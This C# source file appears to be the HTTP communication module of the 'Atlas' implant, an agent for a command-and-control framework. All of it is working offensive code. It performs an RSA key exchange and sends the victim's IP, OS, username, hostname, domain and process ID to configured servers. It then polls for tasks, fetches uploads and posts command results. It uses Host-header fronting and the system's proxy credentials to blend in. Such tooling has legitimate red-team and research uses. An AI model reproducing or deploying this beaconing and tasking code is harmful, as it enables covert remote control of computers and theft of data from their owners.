#define DEFAULT_EKE

using System;
using System.Net;
#if DEFAULT
using System.Text;
#endif
using System.Diagnostics;
using Microsoft.Win32;

namespace Atlas
{
    public class Http
    {
        public static bool CheckIn()
        {
            try
            {
#if DEFAULT_EKE
                Crypto.GenRsaKeys();
                Utils.GetStage GetStage = new Utils.GetStage
                {
                    action = "staging_rsa",
                    pub_key = Crypto.GetPubKey(),
                    session_id = Utils.GetSessionId()

                };
                Config.SessionId = GetStage.session_id;
                string SerializedData = Crypto.EncryptStage(Utils.GetStage.ToJson(GetStage));
                var result = Get(SerializedData, "checkin");
                string final_result = Crypto.Decrypt(result);
                Utils.StageResponse StageResponse = Utils.StageResponse.FromJson(final_result);
                Config.tempUUID = StageResponse.uuid;
                Config.Psk = Convert.ToBase64String(Crypto.RsaDecrypt(Convert.FromBase64String(StageResponse.session_key)));
#endif
                Utils.CheckIn CheckIn = new Utils.CheckIn
                {
                    action = "checkin",
                    ip = Utils.GetIPAddress(),
                    os = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString() + " " + Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", ""),
                    user = Environment.UserName.ToString(),
                    host = Environment.MachineName.ToString(),
                    domain = Environment.UserDomainName.ToString(),
                    pid = Process.GetCurrentProcess().Id,
                    uuid = Config.PayloadUUID,
                    architecture = Utils.GetArch()
                };
#if DEFAULT
                string FinalSerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.PayloadUUID + Utils.CheckIn.ToJson(CheckIn)));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string FinalSerializedData = Crypto.EncryptCheckin(Utils.CheckIn.ToJson(CheckIn));
#endif
                var new_result = Get(FinalSerializedData, null);
#if (DEFAULT_PSK || DEFAULT_EKE)
                string last_result = Crypto.Decrypt(new_result);
#endif
#if DEFAULT
                Utils.CheckInResponse CheckInResponse = Utils.CheckInResponse.FromJson(new_result);
#elif (DEFAULT_PSK || DEFAULT_EKE)
                Utils.CheckInResponse CheckInResponse = Utils.CheckInResponse.FromJson(last_result);
#endif
                Config.UUID = CheckInResponse.id;
                if (CheckInResponse.status == "success")
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch
            {
                return false;
            }
        }

        public static bool GetTasking(Utils.JobList JobList)
        {
            try
            {
                Utils.GetTasking GetTasking = new Utils.GetTasking
                {
                    action = "get_tasking",
                    tasking_size = 3
                };
#if DEFAULT
                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Utils.GetTasking.ToJson(GetTasking)));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string SerializedData = Crypto.Encrypt(Utils.GetTasking.ToJson(GetTasking));
#endif
                var result = Get(SerializedData, null);
#if DEFAULT
                string final_result = Encoding.UTF8.GetString(Convert.FromBase64String(result));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string final_result = Crypto.Decrypt(result);
#endif
                if (final_result.Substring(0, 36) != Config.UUID)
                {
                    return false;
                }
                Utils.GetTaskingResponse GetTaskResponse = Utils.GetTaskingResponse.FromJson(final_result.Substring(36));
                if (GetTaskResponse.tasks[0].command == "")
                {
                    return false;
                }
                foreach (Utils.Task task in GetTaskResponse.tasks) {
                    Utils.Job Job = new Utils.Job
                    {
                        job_id = JobList.job_count,
                        task_id = task.id,
                        completed = false,
                        job_started = false,
                        success = false,
                        command = task.command,
                        parameters = task.parameters
                    };
                    JobList.jobs.Add(Job);
                    ++JobList.job_count;
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static Utils.UploadResponse GetUpload(Utils.Upload Upload)
        {
            try
            {
#if DEFAULT
                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Utils.Upload.ToJson(Upload)));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string SerializedData = Crypto.Encrypt(Utils.Upload.ToJson(Upload));
#endif
                var result = Get(SerializedData, null);
#if DEFAULT
                string final_result = Encoding.UTF8.GetString(Convert.FromBase64String(result));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string final_result = Crypto.Decrypt(result);
#endif
                Utils.UploadResponse UploadResponse = Utils.UploadResponse.FromJson(final_result.Substring(36));

                return UploadResponse;
            }
            catch
            {
                Utils.UploadResponse UploadResponse = new Utils.UploadResponse { };
                return UploadResponse;
            }
        }

        public static bool PostResponse(Utils.JobList JobList)
        {
            try
            {
                Utils.PostResponse PostResponse = new Utils.PostResponse
                {
                    action = "post_response",
                    responses = { }
                };
                foreach (Utils.Job Job in JobList.jobs)
                {
                    if (!Job.completed == false)
                    {
                        if (Job.success == false)
                        {
                            Utils.TaskResponse TaskResponse = new Utils.TaskResponse
                            {
                                task_id = Job.task_id,
                                user_output = null,
                                status = "error",
                                completed = "false",
                                error = Job.response
                            };
                            PostResponse.responses.Add(TaskResponse);
                        }
                        else
                        {
                            Utils.TaskResponse TaskResponse = new Utils.TaskResponse
                            {
                                task_id = Job.task_id,
                                user_output = Job.response,
                                completed = "true",
                                error = null
                            };
                            PostResponse.responses.Add(TaskResponse);
                        }
                    }
                }
                string Data = Utils.PostResponse.ToJson(PostResponse);
                if (Data.Contains("[]"))
                {
                    return false;
                }
#if DEFAULT
                string SerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.UUID + Utils.PostResponse.ToJson(PostResponse)));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string SerializedData = Crypto.Encrypt(Utils.PostResponse.ToJson(PostResponse));
#endif
                var result = Post(SerializedData);
#if DEFAULT
                string final_result = Encoding.UTF8.GetString(Convert.FromBase64String(result));
#elif (DEFAULT_PSK || DEFAULT_EKE)
                string final_result = Crypto.Decrypt(result);
#endif
                Utils.PostResponseResponse PostResponseResponse = Utils.PostResponseResponse.FromJson(final_result.Substring(36));
                foreach (Utils.Response Response in PostResponseResponse.responses)
                {
                    foreach (Utils.Job Job in JobList.jobs)
                    {
                        if (!Job.completed == false)
                        {
                            if (Job.task_id == Response.task_id)
                            {
                                if (Response.status == "success")
                                {
                                    Utils.RemoveJob(Job, JobList);
                                }
                            }
                        }
                    }
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

#if (DEFAULT || DEFAULT_PSK || DEFAULT_EKE)
        public static string Get(string B64Data, string Type)
        {
            string result = null;
            WebClient client = new System.Net.WebClient
            {
                UseDefaultCredentials = true,
                Proxy = WebRequest.DefaultWebProxy
            };
            client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
            client.Headers.Add("User-Agent", Config.UserAgent);
            if (Config.HostHeader != null)
            {
                client.Headers.Add("Host", Config.HostHeader);
            }
            client.QueryString.Add(Config.Param, B64Data.Replace("+", "%2B").Replace("/", "%2F").Replace("=", "%3D").Replace("\n", "%0A"));
            if (Type != null)
            {
                foreach (string Server in Config.Servers)
                {
                    try
                    {
                        string Uri = Server + Config.Url;
                        result = client.DownloadString(Uri);
                        Config.Domain = Server;
                        break;
                    }
                    catch
                    {
                        continue;
                    }
                }
            }
            else
            {
                result = client.DownloadString(Config.Domain + Config.Url);
            }
            return result;
        }

        public static string Post(string B64Data)
        {
            string result = null;
            WebClient client = new System.Net.WebClient
            {
                UseDefaultCredentials = true,
                Proxy = WebRequest.DefaultWebProxy,
            };
            client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
            client.Headers.Add("User-Agent", Config.UserAgent);
            if (Config.HostHeader != null)
            {
                client.Headers.Add("Host", Config.HostHeader);
            }
            string Uri = Config.Domain + Config.Url;
            try
            {
                result = client.UploadString(Uri, B64Data);
                return result;
            }
            catch
            {
                return result;
            }
        }
#endif
    }
}
